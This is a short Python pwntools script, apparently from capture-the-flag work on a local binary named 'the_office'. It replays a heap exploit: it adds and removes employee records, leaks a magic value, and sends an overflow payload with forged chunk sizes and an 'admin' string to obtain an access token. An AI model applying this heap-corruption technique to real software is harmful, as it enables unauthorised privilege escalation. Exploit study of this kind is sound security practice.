import sys, re, struct, time
sys.path.insert(0, ".")
from pwn import context, process
context.log_level = "error"
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "./_z_172_exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

# on rejoue la sequence et on ecrit tout l'input dans un fichier pour strace
io = process("./the_office")
io.recvuntil(b"4) Get access token")
ex.add(io, b"A", email=b"a" * 28)
ex.remove(io, 0)
ex.add(io, b"B", salary=2000, phone=b"222")
ex.add(io, b"C", salary=3000, phone=b"333")
magic = int(re.findall(r"Bldg #: (\d+)", ex.listemps(io).decode("latin-1"))[-1])
ex.remove(io, 0)
payload = b"A" * 28 + struct.pack("<I", magic) + struct.pack("<I", 0x35) * 2 + b"admin\x00"
ex.add(io, b"D", salary=4000, phone=payload)
io.sendline(b"4")
time.sleep(0.6)
print("recu:", repr(io.recv(65536, timeout=2)))
io.sendline(b"0")
time.sleep(0.3)
try:
    print("apres 0:", repr(io.recv(65536, timeout=2)))
except Exception as e:
    print("ERR", e)
io.close()
print("magic=0x%08x  payload=%r" % (magic, payload))
